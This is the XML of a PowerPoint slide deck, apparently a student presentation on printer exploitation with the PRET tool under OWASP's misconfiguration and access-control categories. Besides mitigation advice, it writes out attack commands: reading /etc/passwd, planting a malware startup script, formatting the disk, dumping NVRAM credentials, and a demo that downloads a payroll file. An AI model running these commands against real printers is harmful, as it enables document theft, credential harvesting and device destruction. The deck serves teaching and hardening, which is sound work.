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92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486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2801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4630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544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6459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7373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288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9202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116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031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4688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5603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517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8346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9260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0175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1089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918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3832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5661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6576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7490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39319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0233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1148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2976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4805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9377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0292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0848" y="0"/>
            <a:ext cx="73152" cy="1828800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365760"/>
            <a:ext cx="1463040" cy="347472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365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OWASP TOP 10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PRINTER EXPLOITATION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1737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65" name="Text 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="372291" y="1874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Misconfiguration  ×  Broken Access Control</a:t>
            </a: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31074" y="2626614"/>
            <a:ext cx="5029200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 Varia, Mayank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Anjaria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36347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: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="13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— Printer Exploitation Tool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6576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root@kali:~/Desktop/PRET#</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Text 65">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20D08FA8-64B0-9B6C-23C7-BFB82A16AF7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="319060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Digital Forensics &amp; Information Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="National Forensic Sciences University - Wikipedia">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{198CF8FB-9A65-D69A-6D50-DF63CDDC5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536" y="171120"/>
            <a:ext cx="677008" cy="89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77724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832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OWASP?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161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OWASP Top 10 framework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77724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77724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832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Network Printers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161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printers are high-value attack targets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8308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78308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178308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1837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Tool Introduction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167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Exploitation  Tool walkthrough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78308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78308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178308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837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A05 – Security Misconfiguration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2167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credentials, open protocols, exposed services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78892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78892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" y="278892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A01 – Broken Access Control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3172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to files, jobs, filesystem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78892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78892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278892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843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172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exploitation with PRET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79476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" y="379476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" y="379476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4178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exfiltration, persistence, lateral movement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794760"/>
            <a:ext cx="42976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794760"/>
            <a:ext cx="457200" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="8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3794760"/>
            <a:ext cx="420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5780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&amp; Hardening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4178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strategies and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WHAT IS OWASP?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804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F1F35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68096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 Worldwide Application Security Project — is a non-profit foundation that publishes the</a:t>
            </a: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OWASP Top 10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most critical security risks to web apps and networked systems.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91640"/>
            <a:ext cx="4206240" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0A00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691640"/>
            <a:ext cx="640080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" y="1691640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" y="16916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 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6916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76672" y="169164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313432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31343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1832" y="231343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13432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31343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76672" y="231343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35224"/>
            <a:ext cx="4206240" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0A00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935224"/>
            <a:ext cx="640080" cy="5303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2935224"/>
            <a:ext cx="603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" y="293522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  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35224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93522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76672" y="293522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Components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557016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355701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" y="355701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Failures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57016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55701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76672" y="355701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Data Integrity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178808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41788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1832" y="417880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Failures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4178808"/>
            <a:ext cx="42062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41788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76672" y="417880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focus areas are highlighted above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WHY TARGET PRINTERS?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0292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850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Overlooked in Security Audits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16128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patch servers &amp; endpoints but forget printers are full networked computers.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801368"/>
            <a:ext cx="50292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47088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Sensitive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1854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queues, cached jobs, internal address books, and credentials reside in printer memory.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25496"/>
            <a:ext cx="50292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71216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2898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20954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ship with admin:admin or no password at all — rarely changed in production.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849624"/>
            <a:ext cx="50292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895344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5840" y="39227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Attack Protocols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2336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PJL, PostScript, PCL — all are powerful, unauthenticated by default.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777240"/>
            <a:ext cx="3291840" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="FF31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868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31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~60%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5577840" y="1691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office printers have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2834640"/>
            <a:ext cx="3291840" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A0A"/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926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PJL / PS / PCL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34290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attack surfaces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modern printer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9100 (JetDirect)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wide open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PRET — PRINTER EXPLOITATION TOOL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5303520" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050A05"/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5303520" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F20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680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terminal — pret.py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0972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┌──(kali㉿kali)-[~/Desktop/PRET]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34416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└─$ python2 pret.py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15910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183794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address          device                uptime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20848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─────────────────────────────────────────────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233172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192.168.60.250   HP LaserJet MFP M726  3:52:46   Sleeping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2608" y="257860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192.168.62.1     Canon iR C3226         6 days    paper out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28254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192.168.62.105   EPSON M2170 Series     4:51:21   Ready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2608" y="307238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192.168.63.1     EPSON L3250 Series     7:47:37   -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2608" y="331927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192.168.63.120   HP LaserJet MFP M726   3:20:05   Sleeping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60720" y="749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15000" y="1234440"/>
            <a:ext cx="73152" cy="4572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1234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79592" y="14538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local network for printers automatically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1783080"/>
            <a:ext cx="73152" cy="4572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9592" y="17830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79592" y="20025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PJL, PostScript (PS), and PCL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15000" y="2331720"/>
            <a:ext cx="73152" cy="4572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9592" y="23317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79592" y="25511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printer filesystem (NVRAM, HDD)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15000" y="2880360"/>
            <a:ext cx="73152" cy="4572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9592" y="28803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Capture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79592" y="30998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and retrieve print jobs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15000" y="3429000"/>
            <a:ext cx="73152" cy="4572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9592" y="34290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Dump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79592" y="3648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stored passwords and configs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15000" y="3977640"/>
            <a:ext cx="73152" cy="4572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9592" y="3977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79592" y="41970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or brick vulnerable printers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3974118"/>
            <a:ext cx="8686800" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00151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3812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python2 pret.py 192.168.60.250 pjl    →    Connect via PJL protocol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8016"/>
            <a:ext cx="914400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80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A05:2021 — SECURITY MISCONFIGURATION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" y="713232"/>
            <a:ext cx="86868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49808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 occurs when systems use default settings, unnecessary services are enabled, or security hardening is skipped — making systems vulnerable to trivial exploitation.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463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Printers — Left Side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4206240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0D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783080"/>
            <a:ext cx="73152" cy="8686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47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1671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printers ship with admin/admin or blank passwords. Attackers enumerate with PRET automatically.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788920"/>
            <a:ext cx="4206240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0D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788920"/>
            <a:ext cx="73152" cy="8686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852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PJL Port 9100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31729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JetDirect port allows full printer control with zero authentication by default.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794760"/>
            <a:ext cx="4206240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0D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794760"/>
            <a:ext cx="73152" cy="8686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Info Disclosure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41788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@PJL INFO CONFIG reveals firmware, model, memory, installed cards — goldmine for attackers.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783080"/>
            <a:ext cx="4251960" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0D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783080"/>
            <a:ext cx="73152" cy="8686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8470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Debug Interfaces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216712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community string 'public' allows read access to printer MIB tree.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788920"/>
            <a:ext cx="4251960" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0D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788920"/>
            <a:ext cx="73152" cy="8686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8529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Protocols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317296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PJL and LPD transmit jobs in cleartext — trivial to intercept on local network.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794760"/>
            <a:ext cx="4251960" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0D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794760"/>
            <a:ext cx="73152" cy="8686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858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Logging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1788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jobs, config changes, file access — none are logged in default configuration.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8016"/>
            <a:ext cx="914400" cy="457200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80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A01:2021 — BROKEN ACCESS CONTROL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" y="713232"/>
            <a:ext cx="8686800" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F1F35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49808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means users can act outside their intended permissions  accessing unauthorized data, functions, or system resources. In printers, this means anyone on the network can be root.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1508760"/>
            <a:ext cx="4251960" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="130000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File from Printer Disk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1911096"/>
            <a:ext cx="4023360" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050505"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2233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9476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get /etc/passwd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get /var/spool/lpd/printjobs/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" y="26609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Retrieve stored print jobs, config files, credentials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508760"/>
            <a:ext cx="4251960" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="130000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Arbitrary Files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18888" y="1911096"/>
            <a:ext cx="4023360" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050505"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2233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9476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put malware.bin /etc/init.d/startup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format disk0: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8888" y="26609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Persistent backdoor, destroy filesystem, brick device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172968"/>
            <a:ext cx="4251960" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="130000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NVRAM / Memory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" y="3575304"/>
            <a:ext cx="4023360" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050505"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2233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611880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@PJL DMINFO ASCIIHEX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nvram dump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" y="43251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Extract WiFi passwords, admin PINs, encryption keys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172968"/>
            <a:ext cx="4251960" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="130000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All Print Jobs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18888" y="3575304"/>
            <a:ext cx="4023360" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050505"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2233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611880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capture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jobs list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18888" y="43251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Spy on all documents being printed in real-time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PHASE 1: DISCOVERY &amp; RECONNAISSANCE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3255264"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="030A03"/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8686800" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1A0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680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 root@kali: ~/Desktop/PRET  [192.168.60.0/24]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python2 pret.py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99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Discovering printers on local network...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691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8836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         device                       uptime    status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0756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33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26771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192.168.60.250   HP LaserJet MFP M72630dn     3:52:46   Sleeping....    [PJL]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4597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192.168.62.1     Canon iR C3226 05.13         6 days    paper is out    [PS]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192.168.62.105   EPSON M2170 Series           4:51:21   Ready           [PJL]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8437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192.168.63.1     EPSON L3250 Series           7:47:37   -               [PCL]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0358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192.168.63.120   HP LaserJet MFP M72630dn     3:20:05   Sleeping....    [PJL]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2278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41985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python2 pret.py 192.168.62.105 pjl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6118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Connecting to 192.168.62.105... Connected!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80390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EPSON M2170 — PJL shell ready. Type 'help' for commands.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121408"/>
            <a:ext cx="2286000" cy="329184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21214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A05: No auth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3383280"/>
            <a:ext cx="2286000" cy="329184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33832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A01: Full shell access!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" y="40690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auto-discovers ALL printers via broadcast ARP/mDNS — no credentials required. Connects on port 9100 (JetDirect).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ATTACK FLOW DIAGRAM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463040" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1020"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="FF31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35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92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Tool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801368"/>
            <a:ext cx="548640" cy="36576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70992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280160"/>
            <a:ext cx="1463040" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1020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335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792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9100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801368"/>
            <a:ext cx="54864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170992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A05: Miscfg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1280160"/>
            <a:ext cx="1463040" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1020"/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335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1792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PJL/PS/PCL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4960" y="1801368"/>
            <a:ext cx="54864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70992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A05: No Auth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0" y="1280160"/>
            <a:ext cx="1463040" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A102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335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1792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creds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1801368"/>
            <a:ext cx="548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70992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A01: No AC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1280160"/>
            <a:ext cx="1463040" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1020"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="FF31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1335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9520" y="17922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2926080"/>
            <a:ext cx="8686800" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F1F35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999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POTENTIAL IMPACT CHAIN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3401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Document Theft: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630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confidential contracts, HR records, legal docs being printed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401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Credential Harvest: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3630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passwords, LDAP credentials, admin PINs from NVRAM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9044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Lateral Movement: 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1330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from printer to internal network — printers have full LAN access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9044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Persistence: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41330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firmware/startup script survives reboots and firmware updates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FF3131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REAL-WORLD INCIDENTS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868680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1097280" cy="1298448"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B00">
              <a:alpha val="2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2017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131673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PewDiePie Printer Hack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804672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'TheHackerGiraffe' hijacked 50,000+ internet-exposed printers to print fan propaganda.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207008"/>
            <a:ext cx="7360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— No authentication on port 9100, printers directly internet-exposed.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1554480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unauthorized use of corporate printing resources; demonstrated scale of exposure.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157984"/>
            <a:ext cx="868680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157984"/>
            <a:ext cx="1097280" cy="1298448"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3131">
              <a:alpha val="20000"/>
            </a:srgbClr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1579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313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2019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8600" y="27249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#OpIcarus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17320" y="2212848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Activists exploited exposed printers in financial institutions to print protest flyers.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15184"/>
            <a:ext cx="7360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+ A01 — Default configs, no access control on print queues.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2962656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of operations; highlighted poor IoT security in critical infrastructure.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8686800" cy="129844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566160"/>
            <a:ext cx="1097280" cy="12984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66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" y="4133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Bug Bounty Finds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17320" y="3621024"/>
            <a:ext cx="7360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researchers found critical RCE vulnerabilities in HP LaserJet via PJL/PostScript.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4023360"/>
            <a:ext cx="7360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</a:t>
            </a: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 — Unauthenticated PJL access allows arbitrary code execution.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4370832"/>
            <a:ext cx="7360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printer compromise; potential pivot to internal network; CVE scores 9.0+.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PRACTICAL DEMO WALKTHROUGH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651843"/>
            <a:ext cx="8843553" cy="4357116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="020A02"/>
          </a:solidFill>
          <a:ln w="254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1" y="651843"/>
            <a:ext cx="8843552" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1A0A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60987"/>
            <a:ext cx="83121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0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 PRET Demo — EPSON M2170 @ 192.168.62.105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98102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Connect to printer via PJL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16390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python2 pret.py 192.168.62.105 pjl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34678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[+] Connected to 192.168.62.105 (EPSON M2170)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52966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1254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Gather device information (Security Misconfiguration)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189542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07830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[+] Model: EPSON M2170  Firmware: FL22I4  OS: ThreadX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26118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44406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3: Browse filesystem (Broken Access Control)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62694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ls /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280982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drwxrwxrwx  var/  tmp/  etc/  bin/  lib/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99270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ls /var/spool/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17558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 invoice_scan_001.prn  (87 KB)  [SENSITIVE]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35846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 hr_payroll_oct.pdf    (204 KB) [SENSITIVE]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54134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72422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4: Extract stored document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390710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get /var/spool/hr_payroll_oct.pdf ./stolen/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08998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[+] Download complete: 204 KB received!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27286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45574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5: Dump credentials from NVRAM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63862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pret&gt; nvram dump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821507"/>
            <a:ext cx="82227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[+] ADMIN_PASS  = admin123   WIFI_PSK = company@2024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MITIGATION &amp; HARDENING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251960" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A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457200" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="4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457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804672"/>
            <a:ext cx="1051560" cy="2560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04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A05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58952" y="8046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Credentials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" y="120700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strong admin password on all printers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147218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guest/anonymous access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" y="173736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org-wide password policy for IoT devices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749808"/>
            <a:ext cx="4251960" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A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749808"/>
            <a:ext cx="457200" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="4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49808"/>
            <a:ext cx="457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804672"/>
            <a:ext cx="1051560" cy="2560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804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A01 + A05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239512" y="80467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9512" y="120700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printers on isolated VLAN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39512" y="147218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port 9100 from untrusted networks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9512" y="173736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firewall rules to limit printer access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194560"/>
            <a:ext cx="4251960" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A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194560"/>
            <a:ext cx="457200" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="4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94560"/>
            <a:ext cx="457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37560" y="2249424"/>
            <a:ext cx="1051560" cy="2560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2494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A05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58952" y="22494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Unused Protocols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" y="265176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PJL if not needed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8952" y="291693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SNMP or restrict community strings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" y="318211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FTP, Telnet, unused web services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194560"/>
            <a:ext cx="4251960" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A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194560"/>
            <a:ext cx="457200" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="4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194560"/>
            <a:ext cx="457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818120" y="2249424"/>
            <a:ext cx="1051560" cy="2560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22494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A01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39512" y="22494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Access Controls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9512" y="265176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PIN authentication for print jobs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9512" y="291693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IP whitelist on printer config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39512" y="318211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IPSec for printer communication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3639312"/>
            <a:ext cx="4251960" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A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3639312"/>
            <a:ext cx="457200" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="4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639312"/>
            <a:ext cx="457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337560" y="3694176"/>
            <a:ext cx="1051560" cy="2560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A05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58952" y="3694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Firmware Updates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58952" y="409651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vendor security bulletins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8952" y="436168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firmware patches promptly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58952" y="462686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EOL printers with supported models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3639312"/>
            <a:ext cx="4251960" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A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3639312"/>
            <a:ext cx="457200" cy="1335024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="4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3639312"/>
            <a:ext cx="457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818120" y="3694176"/>
            <a:ext cx="1051560" cy="25603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18120" y="3694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A01 + A05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239512" y="369417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Logging &amp; Monitoring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39512" y="409651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audit logs on printer admin console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239512" y="436168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unusual port 9100 connections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39512" y="462686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printer logs into SIEM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C032"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00C0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VULNERABILITY COMPARISON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658374"/>
            <a:ext cx="1699301" cy="248150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D14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658374"/>
            <a:ext cx="1604896" cy="24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658374"/>
            <a:ext cx="3587414" cy="248150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0D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658374"/>
            <a:ext cx="3493008" cy="24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A05: Security Misconfiguration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658374"/>
            <a:ext cx="3587414" cy="248150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00152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658374"/>
            <a:ext cx="3493008" cy="24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A01: Broken Access Control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042422"/>
            <a:ext cx="1699301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042422"/>
            <a:ext cx="1604896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104242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7672" y="104242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insecurely configured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running with defaults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104242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104242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restrictions on what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do or access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636782"/>
            <a:ext cx="1699301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636782"/>
            <a:ext cx="1604896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Example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74520" y="1636782"/>
            <a:ext cx="3587414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163678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9100 open, no password,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public community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1636782"/>
            <a:ext cx="3587414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63678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files,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NVRAM, capture jobs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231142"/>
            <a:ext cx="1699301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231142"/>
            <a:ext cx="1604896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Command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74520" y="223114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223114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python2 pret.py &lt;ip&gt; pjl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(connects without any creds)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223114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22392" y="223114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pret&gt; ls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pret&gt; get /etc/passwd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825502"/>
            <a:ext cx="1699301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2825502"/>
            <a:ext cx="1604896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Exploit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74520" y="2825502"/>
            <a:ext cx="3587414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282550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Trivial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2825502"/>
            <a:ext cx="3587414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282550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Easy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419862"/>
            <a:ext cx="1699301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419862"/>
            <a:ext cx="1604896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74520" y="341986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47672" y="341986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foothold, info gather,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reconnaissance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341986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22392" y="341986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theft, credential dump,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full control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4014222"/>
            <a:ext cx="1699301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4014222"/>
            <a:ext cx="1604896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74520" y="4014222"/>
            <a:ext cx="3587414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47672" y="401422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defaults, disable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services, patch FW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49240" y="4014222"/>
            <a:ext cx="3587414" cy="384042"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1426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22392" y="401422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auth, VLANs,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whitelisting, PIN print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" y="4608582"/>
            <a:ext cx="1699301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4608582"/>
            <a:ext cx="1604896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Score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74520" y="460858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47672" y="460858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– High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49240" y="4608582"/>
            <a:ext cx="3587414" cy="384042"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111827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22392" y="4608582"/>
            <a:ext cx="3493008" cy="38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– Critical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486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2801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4630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5544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6459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7373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288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9202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116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1031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4688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5603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6517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7432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8346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9260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0175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1089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918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3832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4747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5661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6576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7490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8404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39319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0233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1148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2976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3891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4805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93776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029200"/>
            <a:ext cx="9144000" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="3000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00FF41">
                <a:alpha val="3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"Security is not a product, but a process."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0" y="0"/>
            <a:ext cx="109728" cy="457200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2" name="Shape 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="804672"/>
            <a:ext cx="859536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804672"/>
            <a:ext cx="640080" cy="804672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804672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1005840" y="877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 Are Serious Attack Vectors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005840" y="12070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full OSes, store sensitive data, and have persistent network access — treat them like servers.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4320" y="1709928"/>
            <a:ext cx="859536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" y="1709928"/>
            <a:ext cx="640080" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3131">
              <a:alpha val="30000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FF313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1709928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1005840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Vulnerable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05840" y="21122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A05 — out-of-box printer configs are insecure. Zero changes = full exploitation with PRET in minutes.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2615184"/>
            <a:ext cx="859536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4320" y="2615184"/>
            <a:ext cx="640080" cy="8046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2615184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1005840" y="2688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 Non-Existent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005840" y="3017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A01 — no auth means any network user can dump files, print jobs, and credentials without restriction.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3520440"/>
            <a:ext cx="859536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4320" y="3520440"/>
            <a:ext cx="640080" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="3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352044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1005840" y="3593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Is Simple But Ignored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05840" y="39227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segmentation + credential changes + disable PJL would prevent 90% of attacks demonstrated today.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1802</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>322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OWASP: Printer Security - Security Misconfiguration &amp; Broken Access Control</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>PptxGenJS</dc:creator>
  <cp:lastModifiedBy>Neel `Varia</cp:lastModifiedBy>
  <cp:revision>5</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-01T09:47:03Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-02T04:34:33Z</dcterms:modified>
</cp:coreProperties>
</file>